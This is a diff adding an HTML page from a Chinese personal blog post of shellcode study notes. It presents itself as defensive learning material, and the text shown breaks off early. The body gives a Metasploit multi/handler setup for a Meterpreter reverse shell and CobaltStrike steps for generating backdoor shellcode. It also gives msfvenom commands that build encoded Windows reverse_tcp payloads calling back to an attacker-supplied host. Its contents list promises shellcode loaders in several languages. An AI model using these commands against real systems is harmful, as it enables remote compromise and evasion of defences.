@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/dist/images/favicon_package/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/dist/images/favicon_package/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/dist/images/favicon_package/favicon-16x16.png">
+  <link rel="mask-icon" href="/dist/images/favicon_package/safari-pinned-tab.svg" color="#222">
+  <link rel="manifest" href="/dist/images/favicon_package/site.webmanifest">
+  <meta name="google-site-verification" content="qIz-Tg08U6gyN_53z89yii0ZmKx2avfsO-iyOWhsRx8">
+  <meta name="msvalidate.01" content="096F3D01D2AA04148F10750CD4566535">
+  <meta name="yandex-verification" content="43f790b7e38394a4">
+  <meta name="baidu-site-verification" content="codeva-LMZoUaXjJl">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="/lib/@fortawesome/fontawesome-free/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="/lib/animate.css/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="/lib/pace-js/themes/black/pace-theme-material.css">
+  <script src="/lib/pace-js/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"loli.fj.cn","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"manual"},"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":false,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="https://loli.fj.cn/2024/08/10/ShellCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://loli.fj.cn/2024/08/10/ShellCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","path":"2024/08/10/ShellCode学习笔记/","title":"【笔记】ShellCode学习笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【笔记】ShellCode学习笔记 | 绯鞠的博客</title>
+  
+
+
+
+
+
+
+  <script async defer data-website-id="981ed5a0-eea5-4426-a8a9-c16a789ccc3f" src="https://umami.loli.fj.cn/script.js" data-host-url="https://umami.loli.fj.cn/"></script>
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="绯鞠的博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">绯鞠的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">连蜜统治世界!!!💗</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-reward"><a href="/reward/" rel="section"><i class="fa fa-hand-holding-heart fa-fw"></i>赞助</a></li><li class="menu-item menu-item-command"><a href="/command/" rel="section"><i class="fa fa-book fa-fw"></i>指令</a></li><li class="menu-item menu-item-contribute"><a href="/contribute/" rel="section"><i class="fa fa-chart-line fa-fw"></i>贡献</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>订阅</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+<!-- 加载字体样式 -->
+<link rel="stylesheet" href="/dist/css/fonts.css">
+<!-- 加载鼠标样式 -->
+<link rel="stylesheet" href="/dist/css/cursor.css">
+<!-- 加载滚动条样式 -->
+<link rel="stylesheet" href="/dist/css/scrollbar.css">
+<!-- 加载分类页样式 -->
+<link rel="stylesheet" href="/categories/index.css">
+<!-- 加载标签页样式 -->
+<link rel="stylesheet" href="/tags/index.css">
+<!-- 加载投币动画 -->
+<link rel="stylesheet" href="/dist/css/coin.css">
+
+<!-- 加载颜色常量 -->
+<script type="text/javascript" src="/dist/js/color_library.js"></script>
+<!-- 加载站内快捷键 -->
+<script type="text/javascript" src="/dist/js/hotkey.js"></script>
+<!-- Toast加载 -->
+<script type="text/javascript" src="/dist/js/toast.js"></script>
+<!-- 获取浏览器类型 -->
+<script type="text/javascript" src="/dist/js/get_browser_kind.js"></script>
+<!-- 禁止镜像站 -->
+<script type="text/javascript" src="/dist/js/ban_mirror.js"></script>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9Shell"><span class="nav-number">2.</span> <span class="nav-text">监听反弹Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9Shell"><span class="nav-number">2.1.</span> <span class="nav-text">msf监听反弹Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellCode2%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE"><span class="nav-number">3.</span> <span class="nav-text">ShellCode2进制数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CobaltStrike%E7%94%9F%E6%88%90ShellCode"><span class="nav-number">3.1.</span> <span class="nav-text">CobaltStrike生成ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x86"><span class="nav-number">3.1.1.</span> <span class="nav-text">Windows x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x64"><span class="nav-number">3.1.2.</span> <span class="nav-text">Windows x64</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90ShellCode"><span class="nav-number">3.2.</span> <span class="nav-text">msf生成ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x86-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">Windows x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x64-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">Windows x64</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellCode16%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE"><span class="nav-number">4.</span> <span class="nav-text">ShellCode16进制数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90ShellCode-1"><span class="nav-number">4.1.</span> <span class="nav-text">msf生成ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x86-2"><span class="nav-number">4.1.1.</span> <span class="nav-text">Windows x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x64-2"><span class="nav-number">4.1.2.</span> <span class="nav-text">Windows x64</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellCode%E6%89%A7%E8%A1%8CCMD%E5%91%BD%E4%BB%A4"><span class="nav-number">5.</span> <span class="nav-text">ShellCode执行CMD命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90ShellCode-2"><span class="nav-number">5.1.</span> <span class="nav-text">msf生成ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x64-3"><span class="nav-number">5.1.1.</span> <span class="nav-text">Windows x64</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2%E8%BF%9B%E5%88%B6"><span class="nav-number">5.1.1.1.</span> <span class="nav-text">2进制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#C"><span class="nav-number">5.1.1.2.</span> <span class="nav-text">C#</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C%E8%AF%AD%E8%A8%80ShellCode"><span class="nav-number">6.</span> <span class="nav-text">C语言ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CobaltStrike%E7%94%9F%E6%88%90ShellCode-1"><span class="nav-number">6.1.</span> <span class="nav-text">CobaltStrike生成ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x86-3"><span class="nav-number">6.1.1.</span> <span class="nav-text">Windows x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x64-4"><span class="nav-number">6.1.2.</span> <span class="nav-text">Windows x64</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90ShellCode-3"><span class="nav-number">6.2.</span> <span class="nav-text">msf生成ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x86-4"><span class="nav-number">6.2.1.</span> <span class="nav-text">Windows x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x64-5"><span class="nav-number">6.2.2.</span> <span class="nav-text">Windows x64</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90ShellCode%EF%BC%88Base64%E7%BC%96%E7%A0%81%EF%BC%89"><span class="nav-number">6.3.</span> <span class="nav-text">msf生成ShellCode（Base64编码）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x86-5"><span class="nav-number">6.3.1.</span> <span class="nav-text">Windows x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x64-6"><span class="nav-number">6.3.2.</span> <span class="nav-text">Windows x64</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E4%BA%8EWindows%E7%9A%84ShellCode%E6%89%A7%E8%A1%8C%E5%99%A8"><span class="nav-number">6.4.</span> <span class="nav-text">针对于Windows的ShellCode执行器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#C%E8%AF%AD%E8%A8%80"><span class="nav-number">6.4.1.</span> <span class="nav-text">C语言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ChaitanyaHaritash-Callback-Shellcode-Injection"><span class="nav-number">6.4.1.1.</span> <span class="nav-text">ChaitanyaHaritash&#x2F;Callback_Shellcode_Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E9%A1%B9%E7%9B%AE"><span class="nav-number">6.4.1.1.1.</span> <span class="nav-text">下载项目</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Python"><span class="nav-number">6.4.2.</span> <span class="nav-text">Python</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C-%E8%AF%AD%E8%A8%80ShellCode"><span class="nav-number">7.</span> <span class="nav-text">C#语言ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90ShellCode-4"><span class="nav-number">7.1.</span> <span class="nav-text">msf生成ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x86-6"><span class="nav-number">7.1.1.</span> <span class="nav-text">Windows x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x64-7"><span class="nav-number">7.1.2.</span> <span class="nav-text">Windows x64</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E4%BA%8EWindows%E7%9A%84ShellCode%E6%89%A7%E8%A1%8C%E5%99%A8-1"><span class="nav-number">7.2.</span> <span class="nav-text">针对于Windows的ShellCode执行器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Go%E8%AF%AD%E8%A8%80ShellCode"><span class="nav-number">8.</span> <span class="nav-text">Go语言ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90C%E8%AF%AD%E8%A8%80%E7%9A%84ShellCode"><span class="nav-number">8.1.</span> <span class="nav-text">生成C语言的ShellCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E4%BA%8EWindows%E7%9A%84ShellCode%E6%89%A7%E8%A1%8C%E5%99%A8-2"><span class="nav-number">8.2.</span> <span class="nav-text">针对于Windows的ShellCode执行器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80ShellCode"><span class="nav-number">9.</span> <span class="nav-text">汇编语言ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E4%BA%8EWindows%E7%9A%84ShellCode%E6%89%A7%E8%A1%8C%E5%99%A8-3"><span class="nav-number">9.1.</span> <span class="nav-text">针对于Windows的ShellCode执行器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP%E5%8D%8F%E8%AE%AE%E7%9A%84ShellCode%E6%89%A7%E8%A1%8C%E5%99%A8"><span class="nav-number">9.1.1.</span> <span class="nav-text">HTTP协议的ShellCode执行器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="nav-number">9.1.2.</span> <span class="nav-text">编译代码为可执行文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E8%AF%AD%E8%A8%80ShellCode"><span class="nav-number">10.</span> <span class="nav-text">Java语言ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CobaltStrike%E7%94%9F%E6%88%90ShellCode-2"><span class="nav-number">10.1.</span> <span class="nav-text">CobaltStrike生成ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x86-7"><span class="nav-number">10.1.1.</span> <span class="nav-text">Windows x86</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-x64-8"><span class="nav-number">10.1.2.</span> <span class="nav-text">Windows x64</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90ShellCode-5"><span class="nav-number">10.2.</span> <span class="nav-text">msf生成ShellCode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nim%E8%AF%AD%E8%A8%80ShellCode"><span class="nav-number">11.</span> <span class="nav-text">Nim语言ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#byt3bl33d3r-OffensiveNim-shellcode-bin"><span class="nav-number">11.1.</span> <span class="nav-text">byt3bl33d3r&#x2F;OffensiveNim&#x2F;shellcode_bin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90ShellCode-6"><span class="nav-number">11.1.1.</span> <span class="nav-text">msf生成ShellCode</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#x86"><span class="nav-number">11.1.1.1.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x64"><span class="nav-number">11.1.1.2.</span> <span class="nav-text">x64</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ShellCode%E6%89%A7%E8%A1%8C%E5%99%A8"><span class="nav-number">11.1.2.</span> <span class="nav-text">ShellCode执行器</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#x86-1"><span class="nav-number">11.1.2.1.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x64-1"><span class="nav-number">11.1.2.2.</span> <span class="nav-text">x64</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#byt3bl33d3r-OffensiveNim-shellcode-fiber"><span class="nav-number">11.2.</span> <span class="nav-text">byt3bl33d3r&#x2F;OffensiveNim&#x2F;shellcode_fiber</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90ShellCode-7"><span class="nav-number">11.2.1.</span> <span class="nav-text">msf生成ShellCode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ShellCode%E6%89%A7%E8%A1%8C%E5%99%A8-1"><span class="nav-number">11.2.2.</span> <span class="nav-text">ShellCode执行器</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#x86-2"><span class="nav-number">11.2.2.1.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x64-2"><span class="nav-number">11.2.2.2.</span> <span class="nav-text">x64</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#byt3bl33d3r-OffensiveNim-shellcode-inline-asm-bin"><span class="nav-number">11.3.</span> <span class="nav-text">byt3bl33d3r&#x2F;OffensiveNim&#x2F;shellcode_inline_asm_bin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%9F%E6%88%90C-%E7%9A%84ShellCode"><span class="nav-number">11.3.1.</span> <span class="nav-text">生成C#的ShellCode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ShellCode%E6%89%A7%E8%A1%8C%E5%99%A8-2"><span class="nav-number">11.3.2.</span> <span class="nav-text">ShellCode执行器</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#byt3bl33d3r-OffensiveNim-uuid-exec-bin-nim"><span class="nav-number">11.4.</span> <span class="nav-text">byt3bl33d3r&#x2F;OffensiveNim&#x2F;uuid_exec_bin.nim</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ShellCode%E6%89%A7%E8%A1%8C%E5%99%A8-3"><span class="nav-number">11.4.1.</span> <span class="nav-text">ShellCode执行器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%88%90"><span class="nav-number">12.</span> <span class="nav-text">完成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">13.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="绯鞠"
+      src="/dist/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">绯鞠</p>
+  <div class="site-description" itemprop="description">捕捉一只爱折腾的绯鞠</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:00-isomer-cabbies@icloud.com" title="E-Mail → mailto:00-isomer-cabbies@icloud.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/LittleSweetCookie" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;LittleSweetCookie" rel="noopener me" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+<!-- 设置Aplayer挂载点 -->
+<div id="aplayer"></div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://loli.fj.cn/2024/08/10/ShellCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/dist/images/avatar.gif">
+      <meta itemprop="name" content="绯鞠">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="绯鞠的博客">
+      <meta itemprop="description" content="捕捉一只爱折腾的绯鞠">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【笔记】ShellCode学习笔记 | 绯鞠的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【笔记】ShellCode学习笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-08-10 15:10:28" itemprop="dateCreated datePublished" datetime="2024-08-10T15:10:28+00:00">2024-08-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-23 10:27:43" itemprop="dateModified" datetime="2024-10-23T10:27:43+00:00">2024-10-23</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ShellCode学习笔记</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
+<span id="more"></span>
+
+<h2 id="监听反弹Shell"><a href="#监听反弹Shell" class="headerlink" title="监听反弹Shell"></a>监听反弹Shell</h2><h3 id="msf监听反弹Shell"><a href="#msf监听反弹Shell" class="headerlink" title="msf监听反弹Shell"></a>msf监听反弹Shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST 0.0.0.0</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT &lt;port&gt;</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h2 id="ShellCode2进制数据"><a href="#ShellCode2进制数据" class="headerlink" title="ShellCode2进制数据"></a>ShellCode2进制数据</h2><h3 id="CobaltStrike生成ShellCode"><a href="#CobaltStrike生成ShellCode" class="headerlink" title="CobaltStrike生成ShellCode"></a>CobaltStrike生成ShellCode</h3><h4 id="Windows-x86"><a href="#Windows-x86" class="headerlink" title="Windows x86"></a>Windows x86</h4><ul>
+<li><p><code>攻击</code>-&gt;<code>生成后门</code>-&gt;<code>Payload生成器</code></p>
+</li>
+<li><p>选择<code>监听器</code>，<code>输出格式</code>选择<code>Raw</code>，<code>x64</code>取消勾选<code>使用x64 payload</code>-&gt;<code>生成</code></p>
+</li>
+<li><p>得到后缀名为<code>.bin</code>的文件</p>
+</li>
+</ul>
+<h4 id="Windows-x64"><a href="#Windows-x64" class="headerlink" title="Windows x64"></a>Windows x64</h4><ul>
+<li><p><code>攻击</code>-&gt;<code>生成后门</code>-&gt;<code>Payload生成器</code></p>
+</li>
+<li><p>选择<code>监听器</code>，<code>输出格式</code>选择<code>Raw</code>，<code>x64</code>勾选<code>使用x64 payload</code>-&gt;<code>生成</code></p>
+</li>
+<li><p>得到后缀名为<code>.bin</code>的文件</p>
+</li>
+</ul>
+<h3 id="msf生成ShellCode"><a href="#msf生成ShellCode" class="headerlink" title="msf生成ShellCode"></a>msf生成ShellCode</h3><h4 id="Windows-x86-1"><a href="#Windows-x86-1" class="headerlink" title="Windows x86"></a>Windows x86</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; -f raw &gt; x.raw</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-x64-1"><a href="#Windows-x64-1" class="headerlink" title="Windows x64"></a>Windows x64</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; -e x64/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; -f raw &gt; x.raw</span><br></pre></td></tr></table></figure>
+
+<h2 id="ShellCode16进制数据"><a href="#ShellCode16进制数据" class="headerlink" title="ShellCode16进制数据"></a>ShellCode16进制数据</h2><h3 id="msf生成ShellCode-1"><a href="#msf生成ShellCode-1" class="headerlink" title="msf生成ShellCode"></a>msf生成ShellCode</h3><ul>
+<li>生成结果形如</li>
+</ul>
